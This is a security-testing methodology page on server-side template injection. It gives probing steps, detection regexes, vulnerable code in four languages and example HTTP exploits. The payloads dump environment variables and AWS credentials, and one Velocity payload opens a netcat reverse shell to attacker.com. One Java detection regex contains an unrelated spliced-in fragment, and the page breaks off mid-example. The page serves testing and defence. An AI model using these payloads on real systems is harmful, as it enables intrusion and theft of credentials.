# Server Side Template Injection

## Check List

## Methodology

### Black Box

#### Server‑Side Template Injection (SSTI) in Next.js

{% stepper %}
{% step %}
Embed a site that uses Next.js
{% endstep %}

{% step %}
Note down each endpoint that has input, query parameters, POST body fields, headers, and cookies
{% endstep %}

{% step %}
Send sample requests and look for responses with `Content-Type: text/html` — these are SSR targets
{% endstep %}

{% step %}
Inject benign markers like `SSTI_TEST_123` or `{{7*7}}` into parameters and observe reflections in the response
{% endstep %}

{% step %}
Download JS bundles from `/_next/` and search for keywords such as `dangerouslySetInnerHTML`, `innerHTML`, or `fetch(/api)`
{% endstep %}

{% step %}
Send payloads like `{{7*7}}`, `<%=7*7%>`, or `${7*7}` and check for evaluated output ( `49`) or server errors
{% endstep %}

{% step %}
Look for stack traces or error messages revealing `ejs`, `handlebars`, `pug`, or `render()` usage
{% endstep %}
{% endstepper %}

***

#### [Username Parameter](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Intruder/ssti.fuzz)

{% stepper %}
{% step %}
Enter the target site and then log in
{% endstep %}

{% step %}
Then go to your profile settings and click on edit profile
{% endstep %}

{% step %}
Change the username field input to an SSTI payload as shown below and save `{{7*7}}`
{% endstep %}

{% step %}
Then go from the profile path to the main site path and refresh the page once
{% endstep %}

{% step %}
If a command has been executed on our name and the number 49 appears, the target is vulnerable
{% endstep %}
{% endstepper %}

***

#### File Uploads

{% stepper %}
{% step %}
Check the API documentation or Burp Suite history for paths like `/admin/media/upload`, `/api/upload`, `/file/upload`, or `/api/attachment`
{% endstep %}

{% step %}
Make a normal POST multipart upload with a simple file (`test.txt`) and valid formats parameter (`formats="jpg;png"`)

```http
POST /admin/media/upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file_upload"; filename="test.txt"
Content-Type: text/plain

test
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="formats"

jpg;png
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```
{% endstep %}

{% step %}
Expected Response

```
File format not allowed (some-id)
```
{% endstep %}

{% step %}
Then modify the formats parameter to inject a test SSTI payload like `test<%= 7*7 %>test` and submit the upload

```http
POST /admin/media/upload?actions=false HTTP/1.1
Host: target.com
Referer: http://target.com/admin/profile/edit
Cookie: cookie

-----------------------------327175120238370517612522354688
Content-Disposition: form-data; name="file_upload"; filename="test.txt"
Content-Type: text/plain

test
-----------------------------327175120238370517612522354688
Content-Disposition: form-data; name="thumb_size"

-----------------------------327175120238370517612522354688
Content-Disposition: form-data; name="formats"

test<%= 7*7 %>test
-----------------------------327175120238370517612522354688
```
{% endstep %}

{% step %}
And Response

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Status: 200 OK
Set-Cookie: cookie
Content-Length: 41

File format not allowed (test49test)
```

If the response reflects the calculation (49), SSTI is confirmed.&#x20;
{% endstep %}
{% endstepper %}

***

### White Box

#### Identity Takeover via i18n Fallback Synthesis in Micro-Frontend BFFs

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on localized endpoints, multi-language Single Page Applications (SPAs), or micro-frontend architectures utilizing a Backend-For-Frontend (BFF) proxy
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Dynamic Localization (i18n)" architecture. Modern global platforms do not hardcode UI text. The frontend SPA requests a specific locale dictionary (e.g., `en-US`) from the BFF during the initial load
{% endstep %}

{% step %}
Investigate the translation resolution bottleneck: In hyper-agile environments, frontend developers frequently push new features with new translation keys (e.g., `dashboard.welcome.message`) before the localization team has updated the backend Redis cache
{% endstep %}

{% step %}
Discover the "Dynamic Fallback" optimization. To prevent the UI from rendering broken, raw translation keys to the user, the BFF implements a fallback mechanism. The frontend is permitted to pass a `?fallback=` parameter or a default string within the payload when requesting a missing key
{% endstep %}

{% step %}
Analyze the data hydration logic within the BFF. The fallback string must still support dynamic user variables (e.g., `Welcome, {{user.firstName}}`). To achieve this, the BFF cannot simply return the static string; it must pass the fallback string through the server's native templating engine (e.g., Thymeleaf, Scriban, Twig, Nunjucks) for inline evaluation
{% endstep %}

{% step %}
Understand the architectural assumption: The backend developer assumes that the `fallback` string originates from the trusted, compiled frontend codebase. They treat the fallback parameter as an authoritative template fragment, explicitly bypassing structural sanitization to preserve the templating syntax
{% endstep %}

{% step %}
Formulate the Template Synthesis payload. Because the fallback string is evaluated inline on the server, you must inject an SSTI payload specific to the backend's templating engine
{% endstep %}

{% step %}
Target the resolution endpoint by requesting a deliberately non-existent translation key (e.g., `GET /api/v1/i18n/resolve?key=non.existent.key&fallback={{SSTI_PAYLOAD}}`)
{% endstep %}

{% step %}
Construct a payload designed to exfiltrate the BFF's memory or environment variables, avoiding destructive RCE to maintain stealth. Focus on dumping the active Redis connection strings, internal API keys, or the memory context of other users processed by the same BFF thread
{% endstep %}

{% step %}
Example Payload (Nunjucks/Jinja): `{{ range.constructor("return process.env")() }}`
{% endstep %}

{% step %}
Submit the request to the BFF
{% endstep %}

{% step %}
The BFF queries the Redis translation cache, registers a cache miss, extracts your malicious `fallback` string, and passes it to the inline template evaluator to bind the variables
{% endstep %}

{% step %}
The templating engine executes the injected payload. The BFF serializes the exfiltrated internal environment variables into the localized JSON response and returns it to your browser, resulting in a silent, high-impact compromise of the presentation layer's infrastructure

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Template\.Parse\s*\([\s\S]{0,150}?(?:fallback|default|template)[\s\S]{0,120}?\)\.Render|RazorEngine[\s\S]{0,150}?(?:Compile|Run)[\s\S]{0,100}?(?:fallback|default)|templateEngine\.Parse[\s\S]{0,150}?(?:fallback|default))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:templateEngine\.process\s*\([\s\S]{0,150}?(?:defaultMessage|fallback|template)|TemplateEngine[\s\S]{0,120}?process[\s\S]{0,120}?(?:fallback|default)|VelocityEngine[\s\S]{0,150}?(?:evaluate|merge)[\s\S]{0,100}?(?:fallback|default))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$twig->createTemplate\s*\([\s\S]{0,150}?\$fallback[\s\S]{0,100}?\)->render|Twig[\s\S]{0,150}?createTemplate[\s\S]{0,100}?render|Blade::compileString\s*\([\s\S]{0,120}?(?:fallback|default)|eval\s*\([\s\S]{0,100}?template)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:nunjucks\.renderString\s*\([\s\S]{0,150}?(?:fallbackString|fallback|default)|ejs\.render\s*\([\s\S]{0,150}?(?:fallback|default)|Handlebars\.compile\s*\([\s\S]{0,150}?(?:fallback|template|default))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Template\.Parse\(.*fallback.*Render|RazorEngine.*(Compile|Run).*fallback|templateEngine\.Parse.*fallback
```
{% endtab %}

{% tab title="Java" %}
```regexp
templateEngine\.process\(.*(defaultMessage|fallback)|TemplateEngine.*process.*fallback|VelocityEngine.*evaluate.*fallback
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$twig->createTemplate\(.*\$fallback.*\)->render|Twig.*createTemplate.*render|Blade::compileString.*fallback
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
nunjucks\.renderString\(.*fallbackString|ejs\.render\(.*fallback|Handlebars\.compile\(.*fallback
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class LocalizationBffController : ControllerBase
{
    private readonly ITranslationCache _cache;

    [HttpGet("/api/v1/i18n/resolve")]
    public async Task<IActionResult> ResolveKey(string key, string fallback)
    {
        // [1]
        var translationTemplate = await _cache.GetKeyAsync(key);

        // [2]
        // [3]
        if (string.IsNullOrEmpty(translationTemplate))
        {
            translationTemplate = fallback ?? key;
        }

        // [4]
        // Utilizing Scriban for high-speed inline variable binding
        var template = Template.Parse(translationTemplate);
        var renderedText = await template.RenderAsync(new { user = _currentUser });

        return Ok(new { key, value = renderedText });
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
public class LocalizationBffController {

    @Autowired
    private TranslationCache cache;
    @Autowired
    private TemplateEngine templateEngine;

    @GetMapping("/api/v1/i18n/resolve")
    public ResponseEntity<?> resolveKey(@RequestParam String key, @RequestParam(required = false) String fallback) {
        // [1]
        String translationTemplate = cache.getKey(key);

        // [2]
        // [3]
        if (translationTemplate == null || translationTemplate.isEmpty()) {
            translationTemplate = fallback != null ? fallback : key;
        }

        // [4]
        Context context = new Context();
        context.setVariable("user", currentUser);
        
        // Thymeleaf inline string evaluation
        String renderedText = templateEngine.process(translationTemplate, context);

        return ResponseEntity.ok(Map.of("key", key, "value", renderedText));
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class LocalizationBffController extends Controller
{
    protected $cache;
    protected $twig;

    public function resolveKey(Request $request)
    {
        $key = $request->query('key');
        $fallback = $request->query('fallback');

        // [1]
        $translationTemplate = $this->cache->get($key);

        // [2]
        // [3]
        if (empty($translationTemplate)) {
            $translationTemplate = $fallback ?: $key;
        }

        // [4]
        // Twig dynamic template creation from string
        $template = $this->twig->createTemplate($translationTemplate);
        $renderedText = $template->render(['user' => $this->currentUser]);

        return response()->json(['key' => $key, 'value' => $renderedText]);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class LocalizationBffController {
    static async resolveKey(req, res) {
        let key = req.query.key;
        let fallback = req.query.fallback;

        // [1]
        let translationTemplate = await cache.get(key);

        // [2]
        // [3]
        if (!translationTemplate) {
            translationTemplate = fallback || key;
        }

        // [4]
        // Nunjucks inline string rendering
        let renderedText = nunjucks.renderString(translationTemplate, { user: req.user });

        res.json({ key, value: renderedText });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The Backend-For-Frontend queries the centralized translation memory (Redis) to resolve the requested UI string, \[2] To prevent blocking the frontend render lifecycle when a key inevitably misses the cache, the architecture gracefully degrades to a client-provided fallback string, \[3] The architecture inherently trusts the `fallback` parameter, assuming it was hardcoded into the frontend SPA's compiled JavaScript by a legitimate developer, \[4] The execution sink. To ensure that localized variables (like usernames or dynamic dates) render correctly even during a cache miss, the developer passes the untrusted fallback string directly into the templating engine's inline evaluation method. The attacker leverages this by intentionally requesting a non-existent key and supplying an SSTI payload as the fallback, pivoting a harmless UI rendering pipeline into full Server-Side Template Injection

```http
// 1. Attacker interacts with the multi-language SPA and intercepts the i18n resolution request.
// 2. Attacker modifies the request to query a fake key, forcing a cache miss.
// 3. Attacker injects the SSTI payload into the fallback parameter.

GET /api/v1/i18n/resolve?key=non.existent.key&fallback=%7B%7B%20range.constructor%28%22return%20process.env%22%29%28%29%20%7D%7D HTTP/1.1
Host: bff.enterprise.tld
Authorization: Bearer <low_privilege_token>

// 4. The BFF queries Redis for "non.existent.key". Cache Miss.
// 5. The BFF passes the fallback string "{{ range.constructor("return process.env")() }}" into the templating engine.
// 6. The templating engine evaluates the payload, executing the JavaScript constructor breakout to dump the environment.

HTTP/1.1 200 OK
Content-Type: application/json

{
  "key": "non.existent.key",
  "value": "{\"AWS_ACCESS_KEY_ID\":\"AKIA...\",\"REDIS_PASSWORD\":\"super_secret...\",\"DB_HOST\":\"internal-db.local\"}"
}
```
{% endstep %}

{% step %}
To ensure dynamic frontend architectures remained resilient against translation cache misses, developers implemented an inline fallback synthesis mechanism. The security model explicitly assumed that the client-side SPA was the sole origin of fallback strings, failing to recognize the HTTP parameter as an untrusted, unauthenticated boundary. By intentionally triggering a cache miss, the attacker forced the Backend-For-Frontend to ingest the malicious fallback parameter. The system blindly passed this parameter into the native templating engine to interpolate dynamic variables. The attacker's injected template syntax broke out of the data context, allowing them to execute arbitrary language functions. The response seamlessly exfiltrated the microservice's internal environment variables, resulting in the critical compromise of backend infrastructure secrets without triggering standard application firewalls
{% endstep %}
{% endstepper %}

***

#### Cloud Infrastructure Compromise via AST Node Injection in Serverless Document Pipelines

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on asynchronous, event-driven document generation features (e.g., compiling NDAs, generating monthly invoices, producing customized compliance PDFs)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a Serverless Rendering architecture. Compiling thousands of complex HTML-to-PDF documents consumes excessive CPU and memory. To prevent starving the primary API web servers, the platform delegates document rendering to ephemeral Serverless functions (e.g., AWS Lambda, Azure Functions)
{% endstep %}

{% step %}
Investigate the "Custom Legal Clause" optimization. Enterprise tenants frequently require bespoke legal verbiage injected into standard platform contracts. Instead of requiring tenants to upload entirely new HTML templates (which poses massive security risks), the platform restricts them to defining "Custom Text Clauses" in their organization settings
{% endstep %}

{% step %}
Analyze the template compilation logic inside the Serverless function. The Lambda pulls the master HTML template (e.g., `invoice_base.html`) from an internal S3 bucket. It then retrieves the tenant's `CustomClause` string from the database
{% endstep %}

{% step %}
Discover the architectural shortcut: To allow the tenant's `CustomClause` to display dynamic data (e.g., formatting the `{{Contract.ExpirationDate}}` natively), the developer does not pass the clause as a bound variable. Instead, they dynamically concatenate the `CustomClause` string directly into the master HTML template string _before_ passing the combined document to the templating engine's Abstract Syntax Tree (AST) parser
{% endstep %}

{% step %}
Understand the ephemeral trust assumption: The developer assumes that because the rendering occurs inside a short-lived, isolated Serverless container, the impact of any potential injection is zero. They believe the Lambda contains no persistent state and no sensitive data
{% endstep %}

{% step %}
Recognize the Cloud IAM vulnerability: Serverless functions operate under an assigned IAM Role (e.g., AWS Execution Role). The temporary credentials for this role are exposed via the local container environment variables (`AWS_ACCESS_KEY_ID`, `AWS_SESSION_TOKEN`) or the local metadata endpoint
{% endstep %}

{% step %}
Formulate the Cloud Exfiltration payload. As a Tenant Administrator, navigate to your workspace configuration and define a new custom clause
{% endstep %}

{% step %}
Inject an SSTI payload designed to execute an OS command that reads the Serverless environment variables or queries the cloud provider's metadata service
{% endstep %}

{% step %}
Example Payload (Python/Jinja2):\
&#x20;`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('env').read() }}`
{% endstep %}

{% step %}
Trigger the asynchronous document generation (e.g., by requesting a PDF export of a contract)
{% endstep %}

{% step %}
The API Gateway pushes the event to the Serverless Lambda. The Lambda constructs the template, prepending your malicious clause into the raw HTML string, and compiles the AST
{% endstep %}

{% step %}
The templating engine executes the RCE payload within the container. The generated PDF document is saved to S3 and emailed to you. When you open the PDF, the text contains the plaintext AWS STS credentials of the Lambda function, allowing you to assume the role externally and pivot laterally into the cloud environment

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:var\s+finalTemplate\s*=\s*\w+\s*\+\s*(?:customClause|customTemplate|userTemplate)[\s\S]{0,100}?(?:Engine\.Compile|Compile|Render)|(?:customClause|userTemplate)[\s\S]{0,100}?\+\s*(?:masterTemplate|baseTemplate)[\s\S]{0,100}?(?:Engine\.Compile|Template\.Parse|Render))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:String\s+\w*Template\s*=\s*(?:customClause|customTemplate|userTemplate)\s*\+\s*\w*Template[\s\S]{0,120}?(?:compiler\.process|templateEngine\.process|process)|(?:baseTemplate|masterTemplate)\s*\+\s*(?:customClause|userTemplate)[\s\S]{0,120}?(?:process|compile))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$finalTemplate\s*=\s*\$(?:customClause|customTemplate|userTemplate)\s*\.\s*\$[a-zA-Z0-9_]+[\s\S]{0,120}?(?:createTemplate|render|compile)|\$[a-zA-Z0-9_]+\s*\.\s*\$(?:customClause|userTemplate)[\s\S]{0,120}?->(?:createTemplate|render))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:let\s+\w*template\w*\s*=\s*`?\$\{(?:customClause|userTemplate|customTemplate)\}[\s\S]{0,120}?(?:compile|render|compileAsync)|(?:`\$\{(?:customClause|userTemplate)\}[\s\S]{0,100}\$\{(?:masterTemplate|baseTemplate)\}`))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
var\s+finalTemplate\s*=\s*\w+\s*\+\s*(customClause|customTemplate).*Engine\.Compile|customClause.*masterTemplate.*Compile|customTemplate.*Render
```
{% endtab %}

{% tab title="Java" %}
```regexp
String\s+\w*Template\s*=\s*(customClause|customTemplate)\s*\+.*(baseTemplate|masterTemplate).*compiler\.process|customClause.*process
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$finalTemplate\s*=\s*\$customClause\s*\.\s*\$[a-zA-Z0-9_]+.*createTemplate|\$customTemplate.*render
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
let\s+\w*template\w*\s*=\s*`\$\{(customClause|customTemplate).*compile|createTemplate|render|\$\{customClause\}.*\$\{masterTemplate\}
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class ServerlessPdfGenerator 
{
    public async Task<byte[]> GenerateContractAsync(ContractData data, string customClause) 
    {
        // [1]
        var masterTemplate = await File.ReadAllTextAsync("/opt/templates/master_contract.html");

        // [2]
        // [3]
        // [4]
        var finalTemplateString = $"{customClause}\n\n{masterTemplate}";
        
        // Utilizing RazorLight or Scriban
        var engine = new RazorLightEngineBuilder().UseMemoryCachingProvider().Build();
        
        var renderedHtml = await engine.CompileRenderStringAsync("contractKey", finalTemplateString, data);

        return await ConvertHtmlToPdfAsync(renderedHtml);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class ServerlessPdfGenerator {

    @Autowired
    private TemplateEngine templateEngine;

    public byte[] generateContract(ContractData data, String customClause) throws Exception {
        // [1]
        String masterTemplate = Files.readString(Paths.get("/opt/templates/master_contract.html"));

        // [2]
        // [3]
        // [4]
        String finalTemplateString = customClause + "\n\n" + masterTemplate;
        
        Context context = new Context();
        context.setVariable("data", data);

        String renderedHtml = templateEngine.process(finalTemplateString, context);

        return convertHtmlToPdf(renderedHtml);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class ServerlessPdfGenerator 
{
    protected $twig;

    public function generateContract(ContractData $data, string $customClause): string 
    {
        // [1]
        $masterTemplate = file_get_contents('/opt/templates/master_contract.html');

        // [2]
        // [3]
        // [4]
        $finalTemplateString = "{$customClause}\n\n{$masterTemplate}";
        
        $template = $this->twig->createTemplate($finalTemplateString);
        $renderedHtml = $template->render(['data' => $data]);

        return $this->convertHtmlToPdf($renderedHtml);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class ServerlessPdfGenerator {
    static async generateContract(data, customClause) {
        // [1]
        let masterTemplate = fs.readFileSync('/opt/templates/master_contract.html', 'utf8');

        // [2]
        // [3]
        // [4]
        let finalTemplateString = `${customClause}\n\n${masterTemplate}`;
        
        // Handlebars or Pug
        let template = handlebars.compile(finalTemplateString);
        let renderedHtml = template({ data: data });

        return await convertHtmlToPdf(renderedHtml);
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The Serverless function pulls a highly secure, hardcoded master template from the internal deployment package, \[2] The business requirement dictates that enterprise tenants must be able to inject their own specialized legal text into the document, \[3] To ensure that the tenant's legal text can seamlessly access the application's variables (like dates and names), the developer treats the custom clause as an active template fragment rather than a passive data binding, \[4] The fatal encapsulation failure. By concatenating the untrusted string directly into the master template _prior_ to Abstract Syntax Tree (AST) compilation, the developer completely erases the boundary between code and data. The attacker's payload becomes a native structural component of the template. Even though the execution occurs in an ephemeral serverless container, the attacker leverages the native templating execution to dump the container's environment variables, successfully stealing the Cloud IAM STS tokens provisioned to the function

```http
// 1. Attacker (Tenant Admin) updates their organization's custom legal clause.
// 2. The payload is an SSTI execution string designed to dump the AWS Lambda environment variables.

PUT /api/v1/workspace/settings HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <tenant_admin_token>
Content-Type: application/json

{
  "customLegalClause": "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('env').read() }}"
}

// 3. The API validates the string length and saves it to the database.
// 4. The Attacker clicks "Export Contract to PDF" in the web UI.
// 5. The API Gateway drops an event onto the SQS queue, triggering the Serverless Lambda.
// 6. The Lambda spins up, queries the custom clause, concatenates it with the master HTML, and compiles it.
// 7. Jinja2/Handlebars executes the payload. The 'env' command runs inside the Lambda container.

// 8. The Lambda generates the PDF and emails it to the attacker.
// 9. The attacker opens the PDF. The first page contains:
// AWS_ACCESS_KEY_ID=ASIA...
// AWS_SECRET_ACCESS_KEY=...
// AWS_SESSION_TOKEN=IQoJb3Jp...

// 10. The attacker configures their local AWS CLI with these stolen credentials, 
// bypassing all web application firewalls to interface directly with the cloud provider's API.
```
{% endstep %}

{% step %}
To balance architectural scalability with enterprise customization, engineers decoupled document generation into ephemeral Serverless functions. By allowing tenants to define custom textual clauses, developers sought to avoid the immense security risks of permitting arbitrary HTML file uploads. However, they critically misunderstood the execution flow of template compilers. By concatenating the tenant's text into the template string before compilation, they unintentionally exposed the template engine's AST to untrusted modification. The attacker capitalized on this by injecting native template execution directives. Although the code detonated within a short-lived, isolated Lambda function, the attacker explicitly targeted the container's metadata context, successfully exfiltrating the ephemeral Cloud IAM credentials. This allowed the attacker to escape the serverless sandbox entirely, transitioning a localized application flaw into a severe Cloud Infrastructure compromise
{% endstep %}
{% endstepper %}

***

#### Global Persistence via JIT Compilation of Dynamic Alerting Webhooks

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on massive event-processing platforms, such as SIEMs (Security Information and Event Management), APMs (Application Performance Monitoring), or IT Operations dispatchers (e.g., PagerDuty, Datadog integrations)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Custom Webhook Dispatcher" architecture. When an alert triggers (e.g., `CPU > 90%`), the central dispatcher must send a notification to a third-party service (Slack, Jira, Teams). Because every third-party service requires a completely different JSON schema, the platform allows the user to define a "Custom Webhook Template" (e.g., `{"text": "Alert: {{Alert.Name}} triggered at {{Alert.Time}}"}`)
{% endstep %}

{% step %}
Investigate the throughput optimization inside the central dispatcher microservice. The dispatcher processes up to 100,000 alerts per second. Recursively parsing and string-replacing regular expressions for every single alert payload would cause massive CPU bottlenecks and delayed notifications
{% endstep %}

{% step %}
Discover the "JIT Payload Compilation" optimization. To maximize throughput, the backend developers feed the user's custom JSON payload directly into an enterprise-grade templating engine (e.g., Velocity, FreeMarker, Razor). The engine compiles the JSON string into native bytecode, creating a highly optimized execution delegate that is cached permanently in memory
{% endstep %}

{% step %}
Analyze the sandboxing configuration of the templating engine. The developer assumes that restricting the data context (e.g., only passing the `Alert` object to the template) is sufficient to sandbox the execution
{% endstep %}

{% step %}
Understand the native capabilities of the templating engine. Modern template engines are fully-featured programming languages. Unless explicitly restricted (e.g., disabling class loading, restricting reflection, blocking instantiation), the template can break out of its provided data context and interact directly with the host language's standard library (Java `Runtime`, C# `System.Diagnostics`)
{% endstep %}

{% step %}
Formulate the persistent SSTI payload. As an authorized user, navigate to the Alert Routing or Notification settings
{% endstep %}

{% step %}
Create a new Webhook Integration. In the "Custom Payload" field, inject an SSTI payload that leverages reflection or native class instantiation to execute OS commands
{% endstep %}

{% step %}
Example Payload (Velocity): `#set($engine="")#set($exec=$engine.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null))${exec.exec("nc -e /bin/sh attacker.com 4444")}`
{% endstep %}

{% step %}
Save the webhook integration. The application saves the raw string to the database
{% endstep %}

{% step %}
Trigger an alert (e.g., deliberately crashing a monitored service or clicking "Test Integration")
{% endstep %}

{% step %}
The central dispatcher reads the webhook configuration. To prepare for high-volume transmission, it passes your poisoned JSON string into the templating engine for JIT compilation
{% endstep %}

{% step %}
The templating engine compiles the payload and executes it. The injected reflection code bypasses the restricted data context, instantiates the host language's native process runner, and executes the reverse shell. Because the dispatcher is the central nervous system of the platform, the attacker gains persistent RCE inside the core network, capable of intercepting all global enterprise telemetry

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:engine\.CompileRenderStringAsync\s*\([\s\S]{0,120}?(?:webhookTemplate|payload|template|string)|CompileRenderStringAsync\s*\([\s\S]{0,150}?(?:custom|payload|webhook)|RazorEngine[\s\S]{0,150}?(?:Compile|Run)[\s\S]{0,100}?(?:payload|template))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:response\.setHeader\s*\(\s*"Cache-Control"[\s\S]{0,150}?stale-while-revalidate|headers\.add\s*\(\s*"Cache-Control"[\s\S]{0,150}?stale-while-revalidate|Cache-Control[\s\S]{0,100}?stale-while-revalidate)\b(?:Velocity\.evaluate\s*\([\s\S]{0,120}?(?:payloadString|payload|template)|VelocityEngine[\s\S]{0,150}?(?:evaluate|merge)[\s\S]{0,100}?(?:payload|template)|TemplateEngine[\s\S]{0,120}?(?:process|evaluate))
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$twig->createTemplate\s*\(\s*\$[a-zA-Z0-9_]*(?:customPayload|payload|template)[a-zA-Z0-9_]*\s*\)|Twig[\s\S]{0,150}?createTemplate[\s\S]{0,100}?render|Blade::compileString\s*\([\s\S]{0,120}?(?:payload|template))
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:nunjucks\.compile\s*\([\s\S]{0,100}?(?:customWebhookBody|payload|template)|nunjucks\.renderString\s*\([\s\S]{0,120}?(?:payload|template)|Handlebars\.compile\s*\([\s\S]{0,120}?(?:payload|template)|ejs\.compile\s*\([\s\S]{0,120}?(?:payload|template))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
engine\.CompileRenderStringAsync\(.*(webhookTemplate|payload|template)|CompileRenderStringAsync.*payload|RazorEngine.*Compile.*payload
```
{% endtab %}

{% tab title="Java" %}
```regexp
Velocity\.evaluate\(.*(payloadString|payload|template)|VelocityEngine.*evaluate.*payload|TemplateEngine.*process.*template
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$twig->createTemplate\(\$customPayload\)|createTemplate\(.*\$payload|Blade::compileString\(.*payload
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
nunjucks\.compile\(.*(customWebhookBody|payload|template)|nunjucks\.renderString\(.*payload|ejs\.compile\(.*payload
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class AlertDispatcherWorker : IMessageConsumer<AlertEvent>
{
    private readonly ConcurrentDictionary<string, Object> _compiledWebhooks = new();

    public async Task DispatchAlertAsync(AlertEvent alert, WebhookConfig config) 
    {
        // [1]
        // [2]
        // Utilizing Scriban or RazorLight to JIT compile the user's custom JSON payload
        var engine = new RazorLightEngineBuilder().UseMemoryCachingProvider().Build();

        // [3]
        // [4]
        var renderedPayload = await engine.CompileRenderStringAsync(
            config.Id, 
            config.CustomPayloadTemplate, 
            new { Alert = alert }
        );

        await _httpClient.PostAsync(config.DestinationUrl, new StringContent(renderedPayload, Encoding.UTF8, "application/json"));
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class AlertDispatcherWorker {

    @Autowired
    private VelocityEngine velocityEngine;

    @KafkaListener(topics = "system-alerts")
    public void dispatchAlert(AlertEvent alert, WebhookConfig config) {
        // [1]
        // [2]
        VelocityContext context = new VelocityContext();
        context.put("Alert", alert);

        StringWriter writer = new StringWriter();

        // [3]
        // [4]
        // Velocity evaluates the raw, untrusted JSON string containing the template directives
        Velocity.evaluate(context, writer, "WebhookLog", config.getCustomPayloadTemplate());

        String renderedPayload = writer.toString();
        
        restTemplate.postForObject(config.getDestinationUrl(), renderedPayload, String.class);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class AlertDispatcherWorker implements ShouldQueue
{
    protected $twig;

    public function dispatchAlert(AlertEvent $alert, WebhookConfig $config): void 
    {
        // [1]
        // [2]
        // [3]
        // [4]
        // Twig dynamically compiles the user's custom webhook JSON string
        $template = $this->twig->createTemplate($config->customPayloadTemplate);
        
        $renderedPayload = $template->render(['Alert' => $alert]);

        Http::withBody($renderedPayload, 'application/json')->post($config->destinationUrl);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class AlertDispatcherWorker {
    static async dispatchAlert(alert, config) {
        // [1]
        // [2]
        // [3]
        // [4]
        // Nunjucks compiles the string into an executable JavaScript delegate
        let compiledTemplate = nunjucks.compile(config.customPayloadTemplate);
        
        let renderedPayload = compiledTemplate.render({ Alert: alert });

        await axios.post(config.destinationUrl, renderedPayload, {
            headers: { 'Content-Type': 'application/json' }
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture must route hundreds of thousands of internal system alerts to third-party endpoints, requiring extreme performance optimization, \[2] To support infinitely flexible JSON schemas for external integrations, the system delegates the construction of the final HTTP payload to an enterprise templating engine, \[3] The security model relies entirely on Context Isolation. The developer assumes that by only passing the `Alert` object into the template's context, the template has no capability to interact with the underlying system, \[4] The execution environment collapse. The developer fails to explicitly lock down the templating engine's advanced features (e.g., disabling reflection, preventing class loading, or enabling strict sandboxing mode). By treating the user's custom JSON payload as an authoritative template string, the application grants the attacker the ability to execute native reflection code. The attacker breaks out of the restricted data context, instantiates a native operating system process, and achieves RCE on the central dispatcher microservice

```http
// 1. Attacker (Platform User) configures a Custom Webhook Integration in the SIEM dashboard.
